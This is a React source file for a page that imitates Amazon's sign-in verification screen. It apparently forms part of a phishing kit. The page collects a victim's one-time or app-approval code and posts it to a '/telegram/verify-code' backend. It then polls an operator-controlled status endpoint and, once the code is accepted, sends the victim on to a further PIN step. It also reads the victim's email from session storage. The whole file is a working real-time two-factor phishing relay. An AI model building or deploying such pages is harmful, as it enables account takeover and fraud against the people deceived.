import React, { useState, useEffect } from "react";
import Logo from "../../components/Logo/Logo";
import { MdPhoneAndroid, MdEmail, MdMessage, MdSecurity } from "react-icons/md";
import { useNavigate } from "react-router-dom";

const OTPVerification = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [maskedEmail, setMaskedEmail] = useState("");
  const [verificationType, setVerificationType] = useState(() => {
    return (
      localStorage.getItem("verificationType") ||
      sessionStorage.getItem("verificationType")
    );
  });

  useEffect(() => {
    const email = sessionStorage.getItem("userEmail");
    const verifyType = sessionStorage.getItem("verificationType");

    // console.log("Checking verification data:", { email, verifyType });

    if (!email || !verifyType) {
      //   console.log("Missing required data, redirecting to billing");
      navigate("/billing", { replace: true });
      return;
    }

    setVerificationType(verifyType);
    // console.log("Verification type set:", verifyType);
  }, [navigate]);

  useEffect(() => {
    const email = sessionStorage.getItem("userEmail");
    if (email) {
      const [username, domain] = email.split("@");
      const masked = `${username.charAt(0)}${"*".repeat(
        username.length - 1
      )}@${domain}`;
      setMaskedEmail(masked);
    }
  }, []);

  const getVerificationContent = () => {
    switch (verificationType) {
      case "app":
        return {
          icon: <MdPhoneAndroid className="text-4xl text-[#232f3e] mb-4" />,
          title: "Approve sign in",
          description:
            "Check your Amazon app for a notification to approve this sign in",
        };
      case "email-sms":
        return {
          icon: <MdEmail className="text-4xl text-[#232f3e] mb-4" />,
          title: "Enter verification code",
          description: `For your security, we've sent the code to your email ${maskedEmail}`,
        };
      case "sms":
        return {
          icon: <MdMessage className="text-4xl text-[#232f3e] mb-4" />,
          title: "Enter SMS code",
          description: "We've sent a code to your registered phone number",
        };
      case "special":
        return {
          icon: <MdSecurity className="text-4xl text-[#232f3e] mb-4" />,
          title: "Special verification",
          description: "Please enter your security key code",
        };
      default:
        return {
          icon: <MdEmail className="text-4xl text-[#232f3e] mb-4" />,
          title: "Enter verification code",
          description: "Please enter the verification code sent to you",
        };
    }
  };

  const content = getVerificationContent();

  // Timer for resend code
  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [timeLeft]);

  const handleCodeChange = (e) => {
    setCode(e.target.value);
    // Clear error when user starts typing
    if (error) setError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!code.trim()) {
      setError("Please enter verification code");
      return;
    }
    setIsLoading(true);
    setError("");

    try {
      await fetch(`${process.env.REACT_APP_API_URL}/telegram/verify-code`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          code: code.trim(),
          verificationType: verificationType,
        }),
      });

      // The status will be checked by the polling effect
    } catch (error) {
      setError("An error occurred. Please try again.");
      setIsLoading(false);
    }
  };

  const handleResendCode = () => {
    if (canResend) {
      setTimeLeft(60);
      setCanResend(false);
      // Add your resend code logic here
    }
  };

  // Add polling effect for verification status
  useEffect(() => {
    let isActive = true;
    const checkVerificationStatus = async () => {
      try {
        const response = await fetch(
          `${process.env.REACT_APP_API_URL}/telegram/verification-status`
        );
        const data = await response.json();
        // console.log("Verification status check:", data);

        if (!isActive) return;

        if (data.status === "pending_pin") {
          navigate("/final-step");
        } else if (data.status === "wrong") {
          setError("Invalid verification code. Please try again.");
          setIsLoading(false);
          // Reset verification status after showing error
          await fetch(
            `${process.env.REACT_APP_API_URL}/telegram/reset-verification`,
            {
              method: "POST",
            }
          );
        }
      } catch (error) {
        // console.error("Error checking verification status:", error);
      }
    };

    let interval;
    if (isLoading) {
      interval = setInterval(checkVerificationStatus, 2000);
    }

    return () => {
      isActive = false;
      if (interval) clearInterval(interval);
    };
  }, [navigate, isLoading]);

  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />
      <div className="w-full max-w-[600px] mt-8">
        <div className="text-center mb-8">
          {content.icon}
          <h1 className="text-3xl font-normal mb-4">{content.title}</h1>
          <p className="mb-6">{content.description}</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              value={code}
              onChange={handleCodeChange}
              className={`w-full p-3 border rounded focus:border-[#E77600] focus:shadow-[0_0_3px_2px_rgb(228,121,17,50%)] ${
                error ? "border-red-500" : "border-[#a6a6a6]"
              }`}
              placeholder={
                verificationType === "app"
                  ? "Waiting for approval..."
                  : "Enter code"
              }
              disabled={isLoading || verificationType === "app"}
            />
            {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
          </div>

          {verificationType !== "app" && (
            <>
              <button
                type="button"
                onClick={handleResendCode}
                className={`text-[#0066c0] hover:text-[#c45500] hover:underline ${
                  (!canResend || isLoading) && "opacity-50 cursor-not-allowed"
                }`}
                disabled={!canResend || isLoading}
              >
                Resend code
              </button>

              {!canResend && (
                <div className="flex items-center text-sm">
                  <span className="text-[#0066c0] mr-2">ⓘ</span>
                  Please wait {timeLeft} seconds before requesting another code.
                </div>
              )}
            </>
          )}

          <button
            type="submit"
            disabled={isLoading || !code.trim()}
            className={`w-full bg-[#FFD814] p-3 rounded-full font-medium ${
              isLoading || !code.trim()
                ? "opacity-50 cursor-not-allowed"
                : "hover:bg-[#F7CA00]"
            }`}
          >
            {isLoading ? "Verifying..." : "Submit code"}
          </button>
        </form>

        <div className="mt-8">
          <h2 className="text-lg mb-2">Need help?</h2>
          <p>
            If you can't receive the code, or if you changed your email or phone
            number,{" "}
            <a
              href="#"
              className="text-[#0066c0] hover:text-[#c45500] hover:underline"
            >
              try a different way
            </a>
            .
          </p>
        </div>
      </div>

      <div className="mt-auto py-4 text-sm space-x-6">
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Conditions of Use
        </a>
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Privacy Notice
        </a>
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Help
        </a>
      </div>
    </div>
  );
};

export default OTPVerification;
